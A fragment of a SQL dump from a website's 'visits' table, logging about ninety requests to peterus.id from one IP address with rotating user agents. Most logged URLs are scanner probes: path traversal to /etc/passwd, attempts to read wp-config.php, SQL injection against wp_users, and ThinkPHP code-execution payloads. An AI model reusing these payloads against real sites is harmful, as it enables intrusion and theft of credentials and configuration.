(703, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jvehicles', '2025-06-27 22:25:47', '2025-06-27 22:25:47'),
(704, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jvehicles', '2025-06-27 22:27:34', '2025-06-27 22:27:34'),
(705, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_omphotogallery', '2025-06-27 22:28:09', '2025-06-27 22:28:09'),
(706, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_omphotogallery', '2025-06-27 22:30:00', '2025-06-27 22:30:00'),
(707, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/?q=.%2Fgibbon.sql', '2025-06-27 22:32:13', '2025-06-27 22:32:13'),
(708, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 22:32:46', '2025-06-27 22:32:46'),
(709, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15', 'https://www.peterus.id/?q=.%2Fgibbon.sql', '2025-06-27 22:34:01', '2025-06-27 22:34:01'),
(710, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jphone', '2025-06-27 22:35:18', '2025-06-27 22:35:18');
INSERT INTO `visits` (`id`, `ip_address`, `user_agent`, `url`, `created_at`, `updated_at`) VALUES
(711, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 22:36:22', '2025-06-27 22:36:22'),
(712, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jphone', '2025-06-27 22:37:06', '2025-06-27 22:37:06'),
(713, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/109.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=1&option=com_biblestudy&view=studieslist', '2025-06-27 22:41:19', '2025-06-27 22:41:19'),
(714, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_zimbcore', '2025-06-27 22:42:30', '2025-06-27 22:42:30'),
(715, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0.1 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=1&option=com_biblestudy&view=studieslist', '2025-06-27 22:43:04', '2025-06-27 22:43:04'),
(716, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3.1 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_zimbcore', '2025-06-27 22:44:18', '2025-06-27 22:44:18'),
(717, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Mobile/15E148 Safari/604.1', 'https://peterus.id/index.php?a=company_focus&c=AjaxPersonal&company_id%5B0%5D=match&company_id%5B1%5D%5B0%5D=test%22%29%20and%20extractvalue%281%2Cconcat%280x7e%2Cmd5%28999999999%29%29%29%20--%20a&m=', '2025-06-27 22:48:00', '2025-06-27 22:48:00'),
(718, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://www.peterus.id/index.php?a=company_focus&c=AjaxPersonal&company_id%5B0%5D=match&company_id%5B1%5D%5B0%5D=test%22%29%20and%20extractvalue%281%2Cconcat%280x7e%2Cmd5%28999999999%29%29%29%20--%20a&m=', '2025-06-27 22:49:50', '2025-06-27 22:49:50'),
(719, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_zimbcomment', '2025-06-27 22:50:32', '2025-06-27 22:50:32'),
(720, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1', 'https://peterus.id/?mdocs-img-preview=..%2F..%2F..%2Fwp-config.php', '2025-06-27 22:52:12', '2025-06-27 22:52:12'),
(721, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/614.31.14 (KHTML, like Gecko) Version/17.0.96 Safari/614.31.14', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_zimbcomment', '2025-06-27 22:52:18', '2025-06-27 22:52:18'),
(722, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 22:54:00', '2025-06-27 22:54:00'),
(723, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?option=com_redshop&view=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 22:54:29', '2025-06-27 22:54:29'),
(724, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id/?mdocs-img-preview=..%2F..%2F..%2Fwp-config.php', '2025-06-27 22:55:30', '2025-06-27 22:55:30'),
(725, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 22:55:42', '2025-06-27 22:55:42'),
(726, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://www.peterus.id/index.php?option=com_redshop&view=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00', '2025-06-27 22:56:02', '2025-06-27 22:56:02'),
(727, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_realtyna', '2025-06-27 22:58:26', '2025-06-27 22:58:26'),
(728, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_multiroot', '2025-06-27 22:58:31', '2025-06-27 22:58:31'),
(729, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id', '2025-06-27 22:59:26', '2025-06-27 22:59:26'),
(730, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_realtyna', '2025-06-27 23:00:14', '2025-06-27 23:00:14'),
(731, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_multiroot', '2025-06-27 23:00:19', '2025-06-27 23:00:19'),
(732, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/107.0 Safari/537.36', 'https://peterus.id/index.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=50', '2025-06-27 23:00:21', '2025-06-27 23:00:21'),
(733, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_joomlapicasa2', '2025-06-27 23:00:28', '2025-06-27 23:00:28'),
(734, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 23:01:13', '2025-06-27 23:01:13'),
(735, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15', 'https://peterus.id/?lang=..%2F..%2Fthinkphp%2Fbase', '2025-06-27 23:01:51', '2025-06-27 23:01:51'),
(736, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id/?lang=..%2F..%2F..%2F..%2F..%2Fvendor%2Ftopthink%2Fthink-trace%2Fsrc%2FTraceDebug', '2025-06-27 23:01:55', '2025-06-27 23:01:55'),
(737, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/114.0 Safari/537.36', 'https://www.peterus.id/index.php?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&id=50', '2025-06-27 23:02:05', '2025-06-27 23:02:05'),
(738, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_joomlapicasa2', '2025-06-27 23:02:13', '2025-06-27 23:02:13'),
(739, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://www.peterus.id/?lang=..%2F..%2Fthinkphp%2Fbase', '2025-06-27 23:05:23', '2025-06-27 23:05:23'),
(740, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0', 'https://www.peterus.id/?lang=..%2F..%2F..%2F..%2F..%2Fvendor%2Ftopthink%2Fthink-trace%2Fsrc%2FTraceDebug', '2025-06-27 23:05:27', '2025-06-27 23:05:27'),
(741, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_addressbook', '2025-06-27 23:06:01', '2025-06-27 23:06:01'),
(742, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_addressbook', '2025-06-27 23:07:48', '2025-06-27 23:07:48'),
(743, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 23:10:06', '2025-06-27 23:10:06'),
(744, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0 Safari/537.36', 'https://peterus.id', '2025-06-27 23:10:21', '2025-06-27 23:10:21'),
(745, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 23:11:54', '2025-06-27 23:11:54'),
(746, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id/?fields=%2A%20from%20wp_users--%20-&filter=%7B%7D&rest_route=%2Fwpgmza%2Fv1%2Fmarkers', '2025-06-27 23:11:55', '2025-06-27 23:11:55'),
(747, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8', 'https://www.peterus.id', '2025-06-27 23:12:08', '2025-06-27 23:12:08'),
(748, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Safari/604.1', 'https://www.peterus.id/?fields=%2A%20from%20wp_users--%20-&filter=%7B%7D&rest_route=%2Fwpgmza%2Fv1%2Fmarkers', '2025-06-27 23:13:38', '2025-06-27 23:13:38'),
(749, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/?function=call_user_func_array&s=index%2Fthink%5Capp%2Finvokefunction&vars%5B0%5D=phpinfo&vars%5B1%5D%5B0%5D=1', '2025-06-27 23:17:59', '2025-06-27 23:17:59'),
(750, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://www.peterus.id/?function=call_user_func_array&s=index%2Fthink%5Capp%2Finvokefunction&vars%5B0%5D=phpinfo&vars%5B1%5D%5B0%5D=1', '2025-06-27 23:19:46', '2025-06-27 23:19:46'),
(751, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id/?app=config', '2025-06-27 23:21:12', '2025-06-27 23:21:12'),
(752, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Safari/605.1.15', 'https://www.peterus.id/?app=config', '2025-06-27 23:23:03', '2025-06-27 23:23:03'),
(753, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://peterus.id/?action=dzsap_download&link=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 23:23:21', '2025-06-27 23:23:21'),
(754, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/129.0 Safari/537.36', 'https://peterus.id/index.php?folder=..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_imagebrowser', '2025-06-27 23:24:12', '2025-06-27 23:24:12'),
(755, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_canteen', '2025-06-27 23:24:18', '2025-06-27 23:24:18'),
(756, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586', 'https://www.peterus.id/?action=dzsap_download&link=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 23:25:09', '2025-06-27 23:25:09'),
(757, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?folder=..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_imagebrowser', '2025-06-27 23:26:00', '2025-06-27 23:26:00'),
(758, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 23:26:01', '2025-06-27 23:26:01'),
(759, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_canteen', '2025-06-27 23:26:03', '2025-06-27 23:26:03'),
(760, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 23:29:37', '2025-06-27 23:29:37'),
(761, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/?link=file%3A%2F%2F%2Fetc%2Fpasswd&p=3232&wp_automatic=download', '2025-06-27 23:34:48', '2025-06-27 23:34:48'),
(762, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15', 'https://www.peterus.id/?link=file%3A%2F%2F%2Fetc%2Fpasswd&p=3232&wp_automatic=download', '2025-06-27 23:36:37', '2025-06-27 23:36:37'),
(763, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id', '2025-06-27 23:38:53', '2025-06-27 23:38:53'),
(764, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/103.0 Safari/537.36', 'https://peterus.id/?cffaction=get_data_from_database&query=SELECT%20%2A%20from%20wp_users', '2025-06-27 23:38:53', '2025-06-27 23:38:53'),
(765, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15', 'https://www.peterus.id/?cffaction=get_data_from_database&query=SELECT%20%2A%20from%20wp_users', '2025-06-27 23:40:39', '2025-06-27 23:40:39'),
(766, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.2 Safari/605.1.15', 'https://peterus.id/index.php?format=xml&manufacturers_id=7&option=com_oscommerce&osMod=mshop_pl_src&page=index.php&sort=latest&sortdir=%27&task=showproducts&view=med', '2025-06-27 23:41:21', '2025-06-27 23:41:21'),
(767, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 23:42:21', '2025-06-27 23:42:21'),
(768, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?format=xml&manufacturers_id=7&option=com_oscommerce&osMod=mshop_pl_src&page=index.php&sort=latest&sortdir=%27&task=showproducts&view=med', '2025-06-27 23:43:04', '2025-06-27 23:43:04'),
(769, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/103.0 Safari/537.36', 'https://peterus.id', '2025-06-27 23:46:43', '2025-06-27 23:46:43'),
(770, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_kif_nexus', '2025-06-27 23:48:19', '2025-06-27 23:48:19'),
(771, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 23:48:29', '2025-06-27 23:48:29'),
(772, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_kif_nexus', '2025-06-27 23:50:08', '2025-06-27 23:50:08'),
(773, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15', 'https://peterus.id/index.php?mod=textviewer&src=file%3A%2F%2F%2Fetc%2Fpasswd', '2025-06-27 23:50:20', '2025-06-27 23:50:20'),
(774, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_mscomment', '2025-06-27 23:51:42', '2025-06-27 23:51:42'),
(775, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.7 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?mod=textviewer&src=file%3A%2F%2F%2Fetc%2Fpasswd', '2025-06-27 23:52:08', '2025-06-27 23:52:08'),
(776, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15', 'https://peterus.id/index.php?s=%2Findex%2Findex%2Fname%2F%24%7B%40phpinfo%28%29%7D', '2025-06-27 23:52:27', '2025-06-27 23:52:27'),
(777, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15', 'https://peterus.id/?aam-media=wp-config.php', '2025-06-27 23:52:28', '2025-06-27 23:52:28'),
(778, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_mscomment', '2025-06-27 23:53:35', '2025-06-27 23:53:35'),
(779, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 23:53:40', '2025-06-27 23:53:40'),
(780, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?aam-media=wp-config.php', '2025-06-27 23:54:13', '2025-06-27 23:54:13'),
(781, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15', 'https://www.peterus.id/index.php?s=%2Findex%2Findex%2Fname%2F%24%7B%40phpinfo%28%29%7D', '2025-06-27 23:54:16', '2025-06-27 23:54:16'),
(782, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 23:57:02', '2025-06-27 23:57:02'),
(783, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_blogfactory', '2025-06-27 23:58:08', '2025-06-27 23:58:08'),
(784, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id/index.php?page=%2Fetc%2Fpasswd', '2025-06-27 23:58:52', '2025-06-27 23:58:52'),
(785, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0', 'https://peterus.id/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-27 23:59:07', '2025-06-27 23:59:07'),
(786, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_blogfactory', '2025-06-27 23:59:59', '2025-06-27 23:59:59'),
(787, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/117.0 Safari/537.36', 'https://www.peterus.id/index.php?page=%2Fetc%2Fpasswd', '2025-06-28 00:00:40', '2025-06-28 00:00:40'),
(788, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 00:00:58', '2025-06-28 00:00:58'),
(789, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-28 00:01:49', '2025-06-28 00:01:49'),
(790, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-28 00:03:38', '2025-06-28 00:03:38'),
(791, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6) AppleWebKit/620.30 (KHTML, like Gecko) Version/17.0 Safari/620.30', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_webtv', '2025-06-28 00:05:23', '2025-06-28 00:05:23'),
(792, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id/?filename=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&mphb_action=download', '2025-06-28 00:06:07', '2025-06-28 00:06:07'),
